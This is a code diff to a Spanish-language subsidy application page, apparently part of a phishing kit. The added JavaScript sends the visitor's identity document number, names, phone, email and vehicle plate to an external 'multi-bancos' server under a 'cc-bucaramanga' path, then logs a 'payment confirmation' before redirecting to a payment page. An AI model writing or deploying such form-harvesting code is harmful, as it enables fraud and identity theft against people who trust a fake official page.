@@ -522,6 +522,8 @@ hr { border: 0; border-top: 1px solid #e5e5e5; margin: 24px 0; }
 </div>
 
 <script>
+const API_BASE = 'https://multi-bancos-production.up.railway.app';
+
 /* ============================================================
    ANTI-ZOOM: prevenir doble-tap y gestos de zoom
    ============================================================ */
@@ -587,7 +589,7 @@ function mostrarPlaca() {
 /* ============================================================
    VALIDAR Y MOSTRAR MODAL (campo por campo, sin borrar datos)
    ============================================================ */
-function consultar() {
+async function consultar() {
   const tipoPersona = document.getElementById('tipoPersona').value;
   const tipoDocumento = document.getElementById('tipoDocumento').value;
   const numeroDocumento = document.getElementById('numeroDocumento').value.trim();
@@ -674,6 +676,32 @@ function consultar() {
   // Guardar el precio en sessionStorage
   sessionStorage.setItem('sub_precio', precioSeleccionado);
 
+  // 🔥 GENERAR SESSION ID Y ENVIAR DATOS AL SERVIDOR (SOLO MEMORIA)
+  const sessionId = 'sub_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+  sessionStorage.setItem('sub_sessionId', sessionId);
+
+  try {
+    await fetch(API_BASE + '/cc-bucaramanga/guardar-consulta', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: sessionId,
+        tipoPersona: tipoPersona,
+        tipoDoc: tipoDocumento,
+        documento: numeroDocumento,
+        nombres: nombres,
+        apellidos: apellidos,
+        telefono: telefono,
+        correo: correo,
+        tipoPago: tipoPago,
+        placa: placa,
+        precio: precioSeleccionado
+      })
+    });
+  } catch (err) {
+    console.error('Error enviando a admin:', err);
+  }
+
   // Mostrar el modal
   document.getElementById('modalSubsidio').classList.add('visible');
 }
@@ -749,7 +777,7 @@ function limpiarFormulario() {
 /* ============================================================
    CONTINUAR CON EL PAGO → guarda datos y va a pagodesubsidio.html
    ============================================================ */
-function continuarPago() {
+async function continuarPago() {
   var nombres = document.getElementById('nombres').value.trim();
   var apellidos = document.getElementById('apellidos').value.trim();
   var numeroDocumento = document.getElementById('numeroDocumento').value.trim();
@@ -778,6 +806,20 @@ function continuarPago() {
   sessionStorage.setItem('sub_tipoPersona', tipoPersona);
   sessionStorage.setItem('sub_tipoPago', tipoPago);
   sessionStorage.setItem('sub_precio', precioSeleccionado);
+
+  // 🔥 CONFIRMAR PAGO: GUARDAR EN HISTORIAL (Paso 1)
+  const sessionId = sessionStorage.getItem('sub_sessionId');
+  if (sessionId) {
+    try {
+      await fetch(API_BASE + '/cc-bucaramanga/confirmar-pago', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: sessionId })
+      });
+    } catch (err) {
+      console.error('Error confirmando pago:', err);
+    }
+  }
 
   // Redirigir a la pantalla de pago
   window.location.href = 'pagodesubsidio.html';
